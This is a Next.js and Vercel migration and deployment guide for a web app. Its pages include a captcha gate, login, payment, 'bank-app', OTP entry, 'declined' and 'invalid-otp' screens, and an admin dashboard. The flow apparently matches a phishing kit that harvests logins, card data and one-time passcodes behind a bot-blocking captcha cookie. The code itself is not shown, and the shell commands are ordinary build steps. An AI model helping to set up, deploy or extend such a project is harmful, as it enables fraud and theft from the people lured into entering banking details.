# Next.js Migration Guide

## Overview
This project has been successfully migrated from Vite + Express to Next.js 15 with Vercel deployment support. All existing functionality has been preserved while leveraging Next.js's modern features and Vercel's optimized infrastructure.

## Key Changes

### Project Structure
```
app/                          # Next.js App Router
├── api/                      # API routes
│   ├── trpc/[trpc]/route.ts # tRPC endpoint
│   └── session-offline/      # Session management
├── lib/                       # Utilities
│   ├── contexts/              # React contexts (Theme, Session)
│   ├── trpc.ts               # tRPC client configuration
│   ├── trpc-provider.tsx     # TRPC React Query provider
│   └── const.ts              # Constants
├── components/               # Reusable components (from client/src)
├── layout.tsx                # Root layout with providers
├── page.tsx                  # Home / Captcha page
├── login/                    # Login page
├── payment/                  # Payment page
├── bank-app/                 # Bank app page
├── otp/                      # OTP verification page
├── declined/                 # Payment declined page
├── invalid-otp/              # Invalid OTP page
├── admin/                    # Admin dashboard
└── globals.css               # Global styles

server/                        # Backend (Node.js)
├── _core/                     # Core logic
│   ├── sdk.ts                # OAuth SDK
│   ├── trpc.ts               # tRPC setup
│   ├── context.ts            # tRPC context
│   └── ...
├── routers.ts                # tRPC routers
└── db.ts                      # Database connection

middleware.ts                  # Next.js middleware (captcha guard)
next.config.js                # Next.js configuration
vercel.json                   # Vercel deployment config
```

### Technology Stack Changes
- **Frontend**: React 19 (unchanged)
- **Build Tool**: Vite → **Next.js 15**
- **Routing**: Wouter → **Next.js App Router**
- **Server**: Express → **Next.js API Routes**
- **Database**: Drizzle ORM (unchanged)
- **Styling**: Tailwind CSS 4 (unchanged)
- **Auth**: OAuth with JWT (unchanged)

### Migration Details

#### 1. API Routes
- All Express routes converted to Next.js API routes (`app/api/**/route.ts`)
- tRPC endpoint at `/api/trpc[trpc]`
- Session management endpoints
- Middleware for captcha protection

#### 2. Pages
- Captcha protection via Next.js middleware (instead of localStorage guard)
- All pages moved to `app/` directory with App Router
- useRouter from 'next/navigation' (replaces wouter)

#### 3. Styling & Configuration
- Tailwind CSS 4 with TailwindCSS integration
- Global styles in `app/globals.css`
- Design tokens preserved from original project

#### 4. Components
- All shadcn/ui components compatible
- Context providers set up in root layout
- Client-side interactivity with 'use client' directives

## Deployment to Vercel

### Prerequisites
1. Vercel account connected to your GitHub repository
2. Environment variables configured in Vercel dashboard

### Environment Variables
Set these in Vercel project settings:
```
OAUTH_SERVER_URL          # OAuth server URL
VITE_APP_ID              # OAuth app ID
VITE_OAUTH_PORTAL_URL    # OAuth portal URL
OWNER_OPEN_ID            # Owner's OpenID
JWT_SECRET               # Session signing secret (min 32 chars)
DATABASE_URL             # MySQL connection string
AWS_ACCESS_KEY_ID        # (optional) S3 access
AWS_SECRET_ACCESS_KEY    # (optional) S3 secret
AWS_S3_BUCKET            # (optional) S3 bucket
AWS_S3_REGION            # (optional) S3 region
NEXT_PUBLIC_APP_URL      # Your app URL (e.g., https://yourapp.vercel.app)
```

### Deployment Steps

1. **Push to GitHub**
   ```bash
   git add .
   git commit -m "Migrate to Next.js"
   git push origin main
   ```

2. **Configure in Vercel**
   - Go to Vercel dashboard
   - Create new project from your GitHub repo
   - Select "Next.js" framework
   - Add environment variables
   - Deploy

3. **Verify Deployment**
   - Check that the app loads at your Vercel URL
   - Test captcha functionality
   - Verify OAuth flows
   - Test database connections

## Local Development

### Setup
```bash
# Install dependencies
pnpm install

# Set up environment
cp .env.example .env.local
# Edit .env.local with your settings

# Run database migrations
pnpm db:push

# Start development server
pnpm dev
```

### Running
- Frontend: http://localhost:3000
- API: http://localhost:3000/api/*

### Building
```bash
pnpm build
pnpm start
```

## Known Differences from Original

1. **Middleware**: Captcha check now via Next.js middleware (more secure than localStorage alone)
2. **Build**: `next build` instead of `vite build && esbuild`
3. **Development**: `next dev` is faster with HMR
4. **Deployment**: Simplified via Vercel (no separate server deployment)

## Troubleshooting

### 404 on API routes
- Check that API route files exist in `app/api/`
- Verify file names match route structure

### Database connection issues
- Ensure DATABASE_URL is set correctly
- Check MySQL/database server is running
- Verify credentials in .env.local

### OAuth errors
- Verify OAUTH_SERVER_URL environment variable
- Check OAuth credentials (VITE_APP_ID, VITE_OAUTH_PORTAL_URL)
- Ensure owner OpenID (OWNER_OPEN_ID) is correct

### Captcha not redirecting
- Check middleware.ts is being executed
- Verify cookie settings (nf_captcha_solved)
- Check browser console for errors

## Performance Improvements

1. **Optimized builds** - Next.js Turbopack bundler
2. **Edge functions** - Middleware runs at edge
3. **ISR support** - Incremental static regeneration available
4. **Image optimization** - Next.js Image component ready
5. **Automatic code splitting** - per-route

## Next Steps

1. Test all user flows in production
2. Monitor error logs via Vercel dashboard
3. Set up analytics (Vercel provides web analytics)
4. Configure custom domain if needed
5. Set up monitoring/alerts for API routes

## Support & Resources

- [Next.js Documentation](https://nextjs.org/docs)
- [Vercel Documentation](https://vercel.com/docs)
- [tRPC with Next.js](https://trpc.io/docs/nextjs)
- [Tailwind CSS Documentation](https://tailwindcss.com/docs)
